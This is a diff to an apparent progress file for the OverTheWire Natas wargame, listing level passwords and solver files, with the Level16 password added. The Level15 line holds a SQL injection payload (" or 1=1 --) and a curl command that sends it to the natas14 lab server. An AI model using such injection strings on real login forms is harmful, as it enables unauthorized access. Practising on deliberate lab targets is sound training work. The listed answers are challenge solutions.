@@ -14,7 +14,7 @@ Level12: natas12:       EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3        [natas11.php]
 Level13: natas13:       jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY        [natas12.bash]
 Level14: natas14:       Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1        [natas13.bash]
 Level15: natas15:       AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J        [?debug=1&username= " or 1=1 -- &password=] [curl --user "natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1" "http://natas14.natas.labs.overthewire.org/?debug=1&username=%20%22%20or%201%3D1%20--%20&password=b"]
-Level16: natas16:
+Level16: natas16:       WaIHEacj63wnNIBROHeqi3p9t0m5nhmh        [natas15.go]
 Level17: natas17:
 Level18: natas18:
 Level19: natas19:
